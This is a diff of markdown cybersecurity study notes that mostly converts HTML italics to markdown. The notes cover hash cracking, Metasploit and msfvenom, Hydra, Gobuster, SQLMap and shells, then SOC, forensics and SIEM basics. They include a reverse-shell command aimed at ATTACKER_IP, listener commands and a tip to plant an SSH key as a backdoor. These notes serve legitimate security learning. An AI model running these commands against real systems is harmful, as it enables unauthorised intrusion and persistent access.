-The <i>~/.ssh folder</i> is the default place to store these keys for OpenSSH. The <i>authorized_keys</i> file holds the public eys that are allowed to access to the server if key authentication is enabled.
+The *~/.ssh folder* is the default place to store these keys for OpenSSH. The *authorized_keys* file holds the public eys that are allowed to access to the server if key authentication is enabled.
 
 SSH keys are an excellent way to upgrade a reverse shell. Leaving an SSH key in the authorized keys file on a machine can be a useful backdoor for CTFs, penetration testing, and red teaming.
 
 ### Digital Signatures & Certificates
-<i>Digital signatures</i> provide a way to verify the authenticity and integrity of a digital message or document. This means we know who created or modified these files. 
+*Digital signatures* provide a way to verify the authenticity and integrity of a digital message or document. This means we know who created or modified these files. 
 
 The simplest form of digital signature is encrypting the document with your private key. To verify this signature, they would encrypt it with your public key and check if the files match.
 
-<i>Certificates</i> are linked to digital signatures. These certify that the website you are visiting is legitimate. This is commonly used in HTTPS.
+*Certificates* are linked to digital signatures. These certify that the website you are visiting is legitimate. This is commonly used in HTTPS.
 
 ### PGP & GPG
-<i>Pretty Good Privacy (PGP)</i> is software that that can encrypt files. 
+*Pretty Good Privacy (PGP)* is software that that can encrypt files. 
 
-<i>GnuPG (GPG)</i> is an open-source implementation of the OpenPGP standard. 
+*GnuPG (GPG)* is an open-source implementation of the OpenPGP standard. 
 
 GPG is commonly used in email to protect confidentiality of email messages. It can be used to sign an email and confirm its integrity. Additionally, GPG can be used to decrypt files.
 
@@ -666,11 +667,11 @@ GPG is commonly used in email to protect confidentiality of email messages. It c
 **gpg --decrypt [message.gpg]**: decrypt messages
 
 ## Hashing
-A <i>hash value</i> is a fixed-size string that is computed by a hash function. 
+A *hash value* is a fixed-size string that is computed by a hash function. 
 
-A <i>hash function</i> takes an input of an arbitrary size and returns an output of fixed length (i.e. the hash value). Good hashing algorithms will be relatively fast to compute and slow to reverse. Any slight change in the input data should cause a significant change in the output.
+A *hash function* takes an input of an arbitrary size and returns an output of fixed length (i.e. the hash value). Good hashing algorithms will be relatively fast to compute and slow to reverse. Any slight change in the input data should cause a significant change in the output.
 
-<i>Hashing</i> helps protect data's integrity and ensure password confidentiality. For instance, two main use cases for hashing include:
+*Hashing* helps protect data's integrity and ensure password confidentiality. For instance, two main use cases for hashing include:
 1. Password storage (i.e. authentication)
 2. Data integrity
 
@@ -680,12 +681,12 @@ When it comes to passwords, these are three insecure practices:
 + Storing passwords using a deprecated encryption
 + Storing passwords using an insecure hashing algorithm
 
-Instead of storing passwords in plaintext, storing hash values is more secure. However, these are still vulnerable by using <i>rainbow tables</i>, which are lookup tables of hashes to plaintext (e.g. [CrackStation](https://crackstation.net/), [Hashes.com](https://hashes.com/en/decrypt/hash]).
+Instead of storing passwords in plaintext, storing hash values is more secure. However, these are still vulnerable by using *rainbow tables*, which are lookup tables of hashes to plaintext (e.g. [CrackStation](https://crackstation.net/), [Hashes.com](https://hashes.com/en/decrypt/hash]).
 
-<i>Salting</i> is a means to protect against rainbow tables. The salt is a randomly generated value stored in the database and should be unique to each user. These are added to either the start or the end of the password before it is hashed.
+*Salting* is a means to protect against rainbow tables. The salt is a randomly generated value stored in the database and should be unique to each user. These are added to either the start or the end of the password before it is hashed.
 
 ### Recognising Password Hashes
-On Linux, password hashes are stored in <i>/etc/shadow</i>, which is only readable by root. The file contains password information, where each line contains nine fields separated by colons. More information can be found using **man 5 shadow**.
+On Linux, password hashes are stored in */etc/shadow*, which is only readable by root. The file contains password information, where each line contains nine fields separated by colons. More information can be found using **man 5 shadow**.
 
 The encrypted password field contains the hashed passphrase with four components(e.g. $prefix$options$salt$hash):
 1. prefix (i.e. algorithm id)
@@ -708,12 +709,12 @@ More details can be found using **man 5 crypt**.
 
 A usefule resource for hash formats and password prefixes can be found in [Hashcat Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page.
 
-MS Windows passwords are hashed using NTLM, a variant of MD4. They are visually identical to MD4 and MD5 hashes. Password hashes are stored in the <i>Security Accounts Manager (SAM)</i>. 
+MS Windows passwords are hashed using NTLM, a variant of MD4. They are visually identical to MD4 and MD5 hashes. Password hashes are stored in the *Security Accounts Manager (SAM)*. 
 
 ### Data Integrity Checking
 Hashing can be used to check that files have not been altered. Even if a single bit changes, the hash will change significantly. You can use them to ensure that files have not been modified or to ensure that a downloaded file is identical to the file on the web server. 
 
-<i>Keyed-Hash Message Authentication Code (HMAC)</i> is a type of message authentication code (MAC) that uses a cryptographic hash function in combination with a secret key to verify the authenticity of data. These can be used to ensure that the person who created the HMAC is who they say they are (i.e. authenticity) by using a secret key. This is done in with the following steps:
+*Keyed-Hash Message Authentication Code (HMAC)* is a type of message authentication code (MAC) that uses a cryptographic hash function in combination with a secret key to verify the authenticity of data. These can be used to ensure that the person who created the HMAC is who they say they are (i.e. authenticity) by using a secret key. This is done in with the following steps:
 1. A secret key is padded to the block size of the hash function.
 2. A padded key is XORed with a constant (i.e. block fo zeroes or ones).
 3. Message is hashed using the hash function with the XORed key.
@@ -722,9 +723,9 @@ Hashing can be used to check that files have not been altered. Even if a single 
 
 Technically, the HMAC function is calculated using the following expression:
 
-<i>HMAC(K,M) = H((K⊕opad)||H((K⊕ipad)||M))</i>
+*HMAC(K,M) = H((K⊕opad)||H((K⊕ipad)||M))*
 
-Note: <i>M</i> and <i>K</i> are the message and key
+Note: *M* and *K* are the message and key
 
 ## Cracking Password Hashes
 Online tools such as [Hashcat](https://hashcat.net/hashcat/) and [John the Ripper](https://www.openwall.com/john/) can be used to crack hashes.
@@ -752,7 +753,7 @@ You can acquire NTHash/NTLM hashes by dumping the SAM database using tools such 
 
 
 ### /etc/shadow Cracking:
-To crack /etc/shadow passwords, you must combine it with the /etc/passwd file. You can do this using the <i>unshadow</i> tool.
+To crack /etc/shadow passwords, you must combine it with the /etc/passwd file. You can do this using the *unshadow* tool.
 
 **unshadow [path_to_passwd_file] [path_to_shadow_file]**: invokes shadow tool
 
@@ -768,7 +769,7 @@ Note: prepending the hash with the user name is needed (e.g. adding mike to 1efe
 ### Custom Rules
 John can create passwords dynamically by defining password rules. This is beneficial when you know more information about the password structure of a target (e.g. password complexity requirements).
 
-Custom rules are defined in <i>/etc/john/john.conf</i>. A rule entry will look like the following:
+Custom rules are defined in */etc/john/john.conf*. A rule entry will look like the following:
 
 [List.Rules:RuleName] -> used to define the name of your rule; this is what you will use to call your custom rule a John argument
 
@@ -791,7 +792,7 @@ Note: you can read more about custom rules in [Openwall](https://www.openwall.co
 **john --wordlist=[path_to_wordlist] --rule=[rule_name] [path_to_file]**: invoke custom rule exploitation
 
 ### Cracking Password Protected Zip Files
-The <i>zip2john</i>  tool can be used to convert the zip file into a hash format that John can understand and crack.
+The *zip2john*  tool can be used to convert the zip file into a hash format that John can understand and crack.
 
 The basic syntax is as follows:
 
@@ -802,7 +803,7 @@ Note: [options] allows you to pass specific checksum options, which is often not
 The output from zip2john can now be cracked using regular wordlists.
 
 ### Cracking Password Protected RAR Files
-Similar to zip files, the <i>rar2john</i> tool can be used to convert the rar file into a hash format.
+Similar to zip files, the *rar2john* tool can be used to convert the rar file into a hash format.
 
 The basic syntax is as follows:
 
@@ -811,18 +812,18 @@ The basic syntax is as follows:
 Once again, the output from rar2john can be directly cracked.
 
 ### Cracking SSH Keys
-John can be used to crack SSH private key passwords of id_rsa files. This can be done using the <i>ssh2john</i> tool. 
+John can be used to crack SSH private key passwords of id_rsa files. This can be done using the *ssh2john* tool. 
 
 The basic syntax is as follows:
 
 **ssh2john [id_rsa_private_key_file] > [output_file]**
 
-Note: if you do not have ssh2john installed, it can be found python <i>/usr/share/john/ssh2john.py</i> on Kali
+Note: if you do not have ssh2john installed, it can be found python */usr/share/john/ssh2john.py* on Kali
 
 Once again, the ouput from ssh2john can be directly cracked.
 
 ## Metasploit
-<i>Metasploit</i> is a powerful tool that can support all phases of a penetration testing engagement. It comprises of a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, etc.
+*Metasploit* is a powerful tool that can support all phases of a penetration testing engagement. It comprises of a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, etc.
 
 **msfconsole**: launch Metasploit
 
@@ -846,8 +847,8 @@ Some basic commands for setting variables:
 Metasploit has a number of modules to scan open ports on the target system and network (e.g. search portscan). Note: you can also use nmap commands using the msfconsole prompt. 
 
 For speedier scanning, Metasploit is not the first choice. However, it does provide useful modules for the following:
-+ UDP service identification -> the <i>scanner/discover/udp_sweep</i> module allows to quickly identify services running over UDP (i.e. quick way to identify DNS/NetBIOS)
-+ SMB scans -> auxiliary modules such as <i>smb_enumshares</i> and <i>smb_version</i> are especially useful in corporate networks
++ UDP service identification -> the *scanner/discover/udp_sweep* module allows to quickly identify services running over UDP (i.e. quick way to identify DNS/NetBIOS)
++ SMB scans -> auxiliary modules such as *smb_enumshares* and *smb_version* are especially useful in corporate networks
 
 ### Metasploit Database
 Using the database function can simplify project management when working with several targets.
@@ -882,7 +883,7 @@ Remember, a session can be backgrounded using **-z** or CTRL+Z. Some additional 
 + **sessions -h** -> list options (e.g. **-C** to run a Meterpreter command, **-K** to terminate all sessions)
 
 ### Msfvenom
-<i>Msfvenom</i> allows you to access all payloads available in the Metasploit framework, allowing you to create them in many different formats (e.g. PHP, exe, dll, elf) and for many different target systems (e.g. Apple, Windows, Android, Linux)
+*Msfvenom* allows you to access all payloads available in the Metasploit framework, allowing you to create them in many different formats (e.g. PHP, exe, dll, elf) and for many different target systems (e.g. Apple, Windows, Android, Linux)
 
 **msfvenom -l payloads**: lists all framework payloads
 
@@ -902,7 +903,7 @@ Based on the target's configuration (i.e. OS, webserver, interpreter, etc), msfv
 Note: for the above examples, a handler will be needed as these are reverse payloads
 
 ### Meterpreter
-<i>Meterpreter</i> is a Metasploit payload that runs on a target system and acts as an agent within a command and control architecture. Interaction with the target OS and files is possible using Meterpreter's commands.
+*Meterpreter* is a Metasploit payload that runs on a target system and acts as an agent within a command and control architecture. Interaction with the target OS and files is possible using Meterpreter's commands.
 
 Meterpreter runs on the target system in memory (i.e. RAM) and does not write itself to the disk (i.e. not installed). This feature is added to avoid detection by AVs, which scans new files on disk. Meterpreter also avoids detection by network-based IPS/IDS by using encrypted communication with the server where Metasploit runs (i.e. your attacking machine using TLS). Note: this feature only provides some degree of stealth as Meterpreter is recognised by major AVs.
 
@@ -985,24 +986,24 @@ Websites are primarily created using:
 + CSS - to add styling options
 + JavaScript - to implement complex features on pages using interactivity
 
-In a browser, you can view <i>Page Source</i> to see website elements. Note that sometimes, sensitive information can be left here (e.g. login credentials)
+In a browser, you can view *Page Source* to see website elements. Note that sometimes, sensitive information can be left here (e.g. login credentials)
 
 Other website components include:
-+ <i>Load Balancers</i> - provides two main features: 1) ensure high traffic websites can handle the load, and 2) provide a failover if a server becomes unresponsive
-+ <i>Content Delivery Networks (CDN)</i> - cuts down traffic to a busy website by allowing hosting of static files from your website to other servers; the nearest server is physically located and sends the request there for efficiency
-+ <i>Databases</i> - communicates with webservers to store and recall data; examples include MySQL, MSSQL, MongoDB, Postgred, etc
-+ <i>Web Application Firewall (WAF)</i> - protects the web servers from hacking or DoS attacks (e.g. bot detection, rate limiting)
++ *Load Balancers* - provides two main features: 1) ensure high traffic websites can handle the load, and 2) provide a failover if a server becomes unresponsive
++ *Content Delivery Networks (CDN)* - cuts down traffic to a busy website by allowing hosting of static files from your website to other servers; the nearest server is physically located and sends the request there for efficiency
++ *Databases* - communicates with webservers to store and recall data; examples include MySQL, MSSQL, MongoDB, Postgred, etc
++ *Web Application Firewall (WAF)* - protects the web servers from hacking or DoS attacks (e.g. bot detection, rate limiting)
 
-A <i>web server</i> is a software that listens for incoming connections and uses the HTTP protocol to deliver web content to clients. Common web server software include Apache, Nginx, IIS, and NodeJS. Web servers delivers files from the root directory (e.g. /var/www/html for Linux OS, C:\inetpub\wwwroot for Windows OS).
+A *web server* is a software that listens for incoming connections and uses the HTTP protocol to deliver web content to clients. Common web server software include Apache, Nginx, IIS, and NodeJS. Web servers delivers files from the root directory (e.g. /var/www/html for Linux OS, C:\inetpub\wwwroot for Windows OS).
 
-Web servers use <i>virtual hosts</i> to host multiple websites with different domain names. They do this using text-based configuration files. There is no limit to the number of different websites you can host on a web server.
+Web servers use *virtual hosts* to host multiple websites with different domain names. They do this using text-based configuration files. There is no limit to the number of different websites you can host on a web server.
 
-<i>Static content</i> is content that never changes. Common examples are pictures, JavaScript, CSS, HTML, etc. 
+*Static content* is content that never changes. Common examples are pictures, JavaScript, CSS, HTML, etc. 
 
-<i>Dynamic content</i> is content that could change with different requests. Examples include searching in a website. These changes are done in the backend using programming and scripting languages. Some examples of the languages include PHP, Python, Ruby, NodeJS, Perl, etc. 
+*Dynamic content* is content that could change with different requests. Examples include searching in a website. These changes are done in the backend using programming and scripting languages. Some examples of the languages include PHP, Python, Ruby, NodeJS, Perl, etc. 
 
 ### Uniform Resource Locator (URL)
-A <i>Uniform Resource Locator (URL)</i> is used as an instruction on how to access a resource on the net. URLs have multiple parts. Take for example http://user:password@tryhackme.com:80/view-room?id=1#task3
+A *Uniform Resource Locator (URL)* is used as an instruction on how to access a resource on the net. URLs have multiple parts. Take for example http://user:password@tryhackme.com:80/view-room?id=1#task3
 + Scheme - instructs on what protocol to use (e.g. HTTP, HTTPS, FTP)
 + User - some services require authentication to log in
 + Host - domain name or IP address of the server
@@ -1023,7 +1024,7 @@ Each message follows a specific format that helps both the user and the server c
 + Body - where actual data is stored; might include data user wants to send or where the server puts the content that the user requested
 
 ### HTTP Requests: Request Line & Methods
-The <i>request line</i> or start line is the first part of an HTTP request and has three main parts:
+The *request line* or start line is the first part of an HTTP request and has three main parts:
 + HTTP method
 + URL path
 + HTTP version
@@ -1041,7 +1042,7 @@ HTTP methods show the client's intended action when making HTTP requests. The mo
 + TRACE - shows which methods are allowed; Note: many servers disable this for security reasons
 + CONNECT - used to create a secure connection; Note: it is not as common but is critical for encrypted communication
 
-The <i>URL path</i> tells the server where to find the resource the user is asking for. 
+The *URL path* tells the server where to find the resource the user is asking for. 
 
 E.g. URL - https://tryhackme.com/api/users/123, path - /api/users/123
 
@@ -1050,7 +1051,7 @@ It is crucial to follow these secure practices to avoid common attacks:
 + Santisise the path to avoid injection attacks
 + Protect sensitive data by conducting privacy and risk assessments
 
-The <i>HTTP version</i> shows the protocol version used to communicate between the client and server. Here are the most common ones:
+The *HTTP version* shows the protocol version used to communicate between the client and server. Here are the most common ones:
 + HTTP/0.9 - the first version; only supported GET requests
 + HTTP/1.0 - added headers and better support for different types of content; improved caching
 + HTTP/1.1 - brought persistent connections, chunked transfer coding, and better caching; it is still widely used today
@@ -1058,14 +1059,14 @@ The <i>HTTP version</i> shows the protocol version used to communicate between t
 + HTTP/3 - built on HTTP/2 but uses QUIC for quicker and more secure connections
 
 ### HTTP Request: Headers & Body
-<i>Headers</i> are additional bits of data you can send to the web server when making requests. Common headers include:
+*Headers* are additional bits of data you can send to the web server when making requests. Common headers include:
 + Host - specifies the name of the web server the request is for (e.g. tryhackme.com)
 + User-Agent - information about the web browser the request is coming from (e.g. Mozilla/5.0)
 + Referer - indicates the URL from which the request came from (e.g. https://www.google.com/)
 + Cookie - information the web server previously asked the web browser to store (e.g. user_type=student, room=introtowebapplication, room_status=in_progress)
 + Content-Type - describes what type or format of data is in the request (e.g. application/json)
 
-For POST and PUT, where data is sent to the web server, data is located inside the <i>Request Body</i>. The formatting of the data can take many forms. Some common ones include:
+For POST and PUT, where data is sent to the web server, data is located inside the *Request Body*. The formatting of the data can take many forms. Some common ones include:
 + URL Encoded (i.e. application/x-www-form-urlencoded) - data is structured in key-value pairs, each separated by & (e.g. key1=value1&key2=value2); special characters are percent-encoded
 + Form Data (i.e. multipart/form-data) - allows multiple data blocks to be sent where each block is separated by a boundary string, which is defined in the header (e.g. boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW)
 + JSON (i.e. application/json) - data sent using the JSON structure; formatted in pairs of name:value; multiple pairs are separated by comas and all contained within { } braces
@@ -1085,7 +1086,7 @@ Common response headers include:
 + Content-Encoding - what method has been used to compress the data for smaller data transmission
 
 ### HTTP Response: Status Line & Status Codes
-The first line in every HTTP response is the <i>Status Line</i>. This includes three parts:
+The first line in every HTTP response is the *Status Line*. This includes three parts:
 + HTTP version - details which version of HTTP is used
 + Status Code - three-digit number showing the outcome of the request
 + Reason Phrase - short message explaining the status code in human-readable terms
@@ -1106,7 +1107,7 @@ Common HTTP status codes:
 | 503 - Service Unavailable | Server is either overloaded or down for maintenance |
 
 ### HTTP Response: Headers & Body
-<i>Response headers</i> provide essential information that the client and server need to process everything correctly. These include:
+*Response headers* provide essential information that the client and server need to process everything correctly. These include:
 + Date - shows exact data and time when the response was generated (e.g. Date: Fri, 23 Aug 2024 10:43:21 GMT)
 + Content-Type - tells the client what kind of content it is getting (i.e. HTML, JSON); includes the character set to help the browser display it correctly (e.g. Content-Type: text/html; charset=utf-8)
 + Server - shows the kind of server software is handling the request (e.g. Server: nginx); Note: revealing server information might be useful for attackers, so consider removing/obscuring this
@@ -1114,10 +1115,10 @@ Common HTTP status codes:
 + Cache-Control - tells the client how long it can cache the response before checking in again (e.g. Cache-Control: max-age=600); use no-cache to prevent sensitive info from being cached
 + Location - used in redirection responses (i.e. 3XX status codes); tells the client where to go next if the resource has moved
 
-The <i>response body</i> is where the actual data lives. These can be HTML, JSON, images, etc. Note: to prevent injection attacks (e.g. XSS), always sanitise and escape any data (i.e. user-generated content) before including them in the response
+The *response body* is where the actual data lives. These can be HTML, JSON, images, etc. Note: to prevent injection attacks (e.g. XSS), always sanitise and escape any data (i.e. user-generated content) before including them in the response
 
 ### Security Headers
-HTTP <i>Security Headers</i> help improve overall security of a web application to provide mitigations against attacks such as XSS, clickjacking, etc. These headers include:
+HTTP *Security Headers* help improve overall security of a web application to provide mitigations against attacks such as XSS, clickjacking, etc. These headers include:
 + Content-Security-Policy (CSP) - additional security layer that can help mitigate against common attacks; provides a way for administrators to say what domains or sources are considered safe (i.e. default-src, script-src, style-src); e.g. Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'
 + Strict-Transport-Security (HSTS) - ensures that web browsers will always connect over HTTPS; e.g. Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 + X-Content-Type-Options - used to instruct browsers not to guess the MIME time of a resource but only use the Content-Type header; e.g. X-Content-Type-Options: nosniff
@@ -1126,12 +1127,12 @@ HTTP <i>Security Headers</i> help improve overall security of a web application 
 Note: you can use [securityheaders.com](https://securityheaders.io/) to analyse the security headers of any website
 
 ### HTML Injection
-<i>HTML Injection</i> is a vulnerability that occurs when unfiltered user input is displayed on the page. If a website does not sanitise user input (i.e. filter malicious text input), users can submit HTML or JavaScript code, allowing them to control the page's appearance and functionality.
+*HTML Injection* is a vulnerability that occurs when unfiltered user input is displayed on the page. If a website does not sanitise user input (i.e. filter malicious text input), users can submit HTML or JavaScript code, allowing them to control the page's appearance and functionality.
 
-<i>Input sanitation</i> is a means to protect a website secure. 
+*Input sanitation* is a means to protect a website secure. 
 
 ## JavaScript
-<i>JavaScript (JS)</i> is a scripting language that adds interactive features to websites containing HTML and CSS (e.g. validation, onClick actions, animations, etc). 
+*JavaScript (JS)* is a scripting language that adds interactive features to websites containing HTML and CSS (e.g. validation, onClick actions, animations, etc). 
 
 JS is an interpreted language, which means the code is executed directly in a browser without prior compilation.
 
@@ -1258,7 +1259,7 @@ Note: you can use [Code Beautify](https://codebeautify.org/javascript-obfuscator
 + Minify and obfuscate your JS code; this reduces size, improve load times, and make it harder for attackers to understand code
 
 ## SQL
-<i>Structured Query Language (SQL)</i> is a programming language that can be used to query, define, and manipulate data stored in a relational database. We use these in popular Database Management Systems (DBMS) such as MySQL, MongoDB, Oracle DB, and Maria DB.
+*Structured Query Language (SQL)* is a programming language that can be used to query, define, and manipulate data stored in a relational database. We use these in popular Database Management Systems (DBMS) such as MySQL, MongoDB, Oracle DB, and Maria DB.
 
 ### Database Statements
 Create Database
@@ -1433,7 +1434,7 @@ SELECT MIN(published_date) AS earliest_book FROM books;
 ```
 
 ## Burp Suite
-<i>Burp Suite</i> is a Java-based framework that provides solutions for web application testing. These days, it is an industry standard tool for hands-on security assessments of web and mobile applications (i.e. those that rely on APIs). In a nutshell, Burp Suite captures and enables manipulation of HTTP/HTTPS traffic between a browser and a web server. 
+*Burp Suite* is a Java-based framework that provides solutions for web application testing. These days, it is an industry standard tool for hands-on security assessments of web and mobile applications (i.e. those that rely on APIs). In a nutshell, Burp Suite captures and enables manipulation of HTTP/HTTPS traffic between a browser and a web server. 
 
 Note: Burp Suite Professional is the unrestricted version, while Burp Suite Community comes free; Burp Suite Enterprise is primarily used for continuous scanning
 
@@ -1449,7 +1450,7 @@ Though limited, Burp Suite Community provides key features such as:
 ### 1. Broken Access Control
 Broken access control allows attackers to bypass authorisation, which gives them access to sensitive data or perform tasks they should not be able to. 
 
-An example of this is <i>Insecure Direct Object Referencing (IDOR)</i>, which is an access control vulnerability where Direct Object References are exposed in a URL (e.g. https://bank.thm/account?id=111111). These objects can be files, users, account numbers, etc.
+An example of this is *Insecure Direct Object Referencing (IDOR)*, which is an access control vulnerability where Direct Object References are exposed in a URL (e.g. https://bank.thm/account?id=111111). These objects can be files, users, account numbers, etc.
 
 ### 2. Cryptographic Failures
 A cryptographic failure arises from the misuse/lack of cryptographic algorithms for protecting sensitive information (i.e. data in transit, data at rest). These result in the divulging of sensitive data linked to customers (e.g. names, DoBs, financial information, credentials).
@@ -1521,7 +1522,7 @@ SSRF can be used further to:
 + Interact with non-HTTP services (i.e. to get RCE)
 
 ## Hydra
-<i>Hydra</i> is a brute force password cracking program tool. This can be used to run through a password list and crack some authentication services (e.g. SSH, web app form, FTP, SNMP). 
+*Hydra* is a brute force password cracking program tool. This can be used to run through a password list and crack some authentication services (e.g. SSH, web app form, FTP, SNMP). 
 
 ### Commands
 Hydra commands follow the following syntax:
@@ -1555,7 +1556,7 @@ Example Post Web Form
 E.g. hydra -l [username] -P [wordlist] [IP_address] http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
 ## Gobuster
-<i>Gobuster</i> is a reconaissance tool that can be used to enumerate web directories, DNS subdomains, virtual hosts, S3 buckets, and Google Cloud Storage. This utilises brute force using specific wordlists. 
+*Gobuster* is a reconaissance tool that can be used to enumerate web directories, DNS subdomains, virtual hosts, S3 buckets, and Google Cloud Storage. This utilises brute force using specific wordlists. 
 
 Basic syntax: **gobuster [command] [flags]**
 
@@ -1615,7 +1616,7 @@ Some commonly used flags include:
 E.g. gobuster vhost -u "http://10.10.31.174" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 
 
 ## Shells
-<i>Shells</i> allow users to interact with an OS, usually through a CLI. Attackers use these shells on compromised systems to do execute several activities, which include:
+*Shells* allow users to interact with an OS, usually through a CLI. Attackers use these shells on compromised systems to do execute several activities, which include:
 + Remote system control
 + Privilege escalation
 + Data exfiltration
@@ -1703,19 +1704,19 @@ Other can be found on [r57shell.net](https://www.r57shell.net/index.php).
 ### Other Shell Listeners
 Other tools that can be used as listeners include:
 
-<i>Rlwrap</i> - provides editing keyboard and history; wrapping **nc** with **rlwrap** allows the use of arrow keys and history for better interaction
+*Rlwrap* - provides editing keyboard and history; wrapping **nc** with **rlwrap** allows the use of arrow keys and history for better interaction
 
 ```
 rlwrap nc -lvnp 443
 ```
 
-<i>Ncat</i> - improved version of Netcat; provides extra features such as encryption (i.e. SSL)
+*Ncat* - improved version of Netcat; provides extra features such as encryption (i.e. SSL)
 
 ```
 ncat --ssl -lvnp 4444
 ```
 
-<i>Socat</i> - allows creation of socket connections between two data sources (e.g. two hosts)
+*Socat* - allows creation of socket connections between two data sources (e.g. two hosts)
 
 ```
 socat -d -d TCP-LISTEN:443 STDOUT
@@ -1793,7 +1794,7 @@ busybox nc ATTACKER_IP 443 -e sh
 ```
 
 ## SQLMap
-<i>SQLMap</i> is an automated tool for detecting and exploiting SQLi vulnerabilities in web apps. 
+*SQLMap* is an automated tool for detecting and exploiting SQLi vulnerabilities in web apps. 
 
 Basic syntax: **sqlmap -u [GET_URL] [flags]**
 
@@ -1813,7 +1814,7 @@ Main SQLi flags include:
 E.g. sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' -D users -T thomas --dump
 
 ## SOC
-A <i>Security Operations Center (SOC)</i> is a specialised security facility that monitors an organisation's network and resources and identify suspicious activity. Their main focus is to keep detection and response robust
+A *Security Operations Center (SOC)* is a specialised security facility that monitors an organisation's network and resources and identify suspicious activity. Their main focus is to keep detection and response robust
 
 Detection can be in relation to: vulnerabilities, unauthorised activity, policy violations, intrusions. Support often occurs in conjunction with incident response once an incident is detected.
 
@@ -1823,7 +1824,7 @@ The three pillars of a SOC include:
 + Technology (SIEM, EDR, firewalls, etc)
 
 ## Digital Forensics
-<i>Digital forensics</i> primarily involve the use of tools and techniques to investigate digital devices to find and analyse evidence for necessary legal action.
+*Digital forensics* primarily involve the use of tools and techniques to investigate digital devices to find and analyse evidence for necessary legal action.
 
 ### Methodology
 The National Institute of Standards and Technology (NIST) introduced four phases for the process of digital forensics. These are:
@@ -1865,7 +1866,7 @@ Image files have Exchangeable Image File Format (EXIF) metadata. These can inclu
 Basic syntax: **exiftool [image.jpg]**
 
 ## Incident Response
-<i>Incident response (IR)</i> handles incidents from start to end. Incidents are true positive alerts, which are given a severity level. These can be categorised into different types:
+*Incident response (IR)* handles incidents from start to end. Incidents are true positive alerts, which are given a severity level. These can be categorised into different types:
 + Malware infections
 + Security breaches (i.e. unauthorised access)
 + Data leaks
@@ -1889,7 +1890,7 @@ The NIST framework has four phases:
 3. Containment, Eradication, and Recovery
 4. Post-Incident Activity
 
-Each of these process has a formal document listing all relevant organisational procedures called an <i>incident response plan</i>. Key components of this plan include:
+Each of these process has a formal document listing all relevant organisational procedures called an *incident response plan*. Key components of this plan include:
 + Roles and responsibilities
 + Incident response methodology
 + Communication plan with stakeholders
@@ -1902,11 +1903,11 @@ Multiple security solutions can aid in the various phases of the IR process (i.e
 + EDR - deployed on every system to contain and eradicate advanced-level threats
 
 After identification, certain procedures must be followed. The following can be used for different kinds of incidents:
-+ <i>Playbooks</i> - guidelines for a comprehensive incident response
-+ <i>Runbooks</i> - detailed step-by-step methodology during incidents
++ *Playbooks* - guidelines for a comprehensive incident response
++ *Runbooks* - detailed step-by-step methodology during incidents
 
 ## Logs
-<i>Logs</i> are digital footprints left behind by activities, whether they are intended or malicious. These play an important role in the following areas:
+*Logs* are digital footprints left behind by activities, whether they are intended or malicious. These play an important role in the following areas:
 + Security Events Monitoring - detecting anomalous behaviour in real-time
 + Incident Investigation and Forensics - offers detailed information and traces to the root cause of incidents
 + Troubleshooting - documents errors in systems/applications for diagnosis and fixing
@@ -1924,7 +1925,7 @@ Logs can be grouped into multiple categories, depending on their information. Th
 | Access Logs | details information about access to different resources | Webserver Access, Database Access, Application Access, API Access logs |
 
 ### E.g. Windows Event Logs
-In Windows systems, <i>Event Viewer</i> provides a GUI tool to view and search for logs. These logs typically include these fields:
+In Windows systems, *Event Viewer* provides a GUI tool to view and search for logs. These logs typically include these fields:
 + Description
 + Log Name
 + Logged
@@ -1945,7 +1946,7 @@ Event IDs can be used to search for a specific activity. Refer to the table belo
 Note: these event IDs can be used for filtering logs
 
 ### E.g. Linux Webserver Access Logs
-These kinds of logs contain all requests made to the website. Information such as timeframe, IP requested, type, and URL are included. These can be found in the directory: <i>/var/log/apache2/access.log</i>
+These kinds of logs contain all requests made to the website. Information such as timeframe, IP requested, type, and URL are included. These can be found in the directory: */var/log/apache2/access.log*
 
 Some manual analysis commands:
 + **cat [file.log]**
@@ -1954,7 +1955,7 @@ Some manual analysis commands:
 + **less [file.log]** - separates log file into chunks (i.e. page at a time); use spacebar to move to next page, b to previous page; type / then pattern to search; use n to navigate to next occurence of search, N to navigate to the previous occurrence
 
 ## SIEM
-<i>Security Information and Event Management System (SIEM)</i> is a tool that collects data from various endpoints across the network to a centralised location and performs correlation.
+*Security Information and Event Management System (SIEM)* is a tool that collects data from various endpoints across the network to a centralised location and performs correlation.
 
 SIEMs have the advantage of taking these logs from various sources but also provides an abilityo to correlate between events, search through logs, investigate incidents, and respond appropriately. Some key features include:
 + Real-time log ingestion
@@ -1969,14 +1970,14 @@ Remember that there are different types of log sources
 + Host-Centric Log Sources - capture events that occurred within or related to a host (e.g. Windows Event logs, Sysmon, Osquery, etc)
 + Network-Centric Log Sources - generated when hosts communicate with each other or through the internet (e.g. SSH, VPN, HTTP/s, FTP, etc)
 
-For Windows, <i>Event Viewer</i> is the main tool where different logs are stored and viewed. These logs are forwarded to the SIEM for better monitoring and visibility.
+For Windows, *Event Viewer* is the main tool where different logs are stored and viewed. These logs are forwarded to the SIEM for better monitoring and visibility.
 
 For Linux, common locations for log storage include:
-+ <i>/var/log/httpd</i> - contains HTTP request/reponse and error logs
-+ <i>/var/log/apache</i> - contains apache related logs
-+ <i>/var/log/cron</i> - stores cron jobs events
-+ <i>/var/log/auth.log</i> and <i>/var/log/secure</i> - stores authentication logs
-+ <i>/var/log/kern</i> - stores kernel related events
++ */var/log/httpd* - contains HTTP request/reponse and error logs
++ */var/log/apache* - contains apache related logs
++ */var/log/cron* - stores cron jobs events
++ */var/log/auth.log* and */var/log/secure* - stores authentication logs
++ */var/log/kern* - stores kernel related events
 
 ### Log Ingestion
 Each SIEM has its own way of ingesting logs. Common methods include:
@@ -2006,7 +2007,7 @@ Analysts spend most of their time on the dashboards, watching for triggers. Once
 4. Block the suspicious IP.
 
 ## Firewalls
-A <i>firewall</i> inspects a network/device's incoming and outgoing traffic, which then allows or denies based on specific rules. 
+A *firewall* inspects a network/device's incoming and outgoing traffic, which then allows or denies based on specific rules. 
 
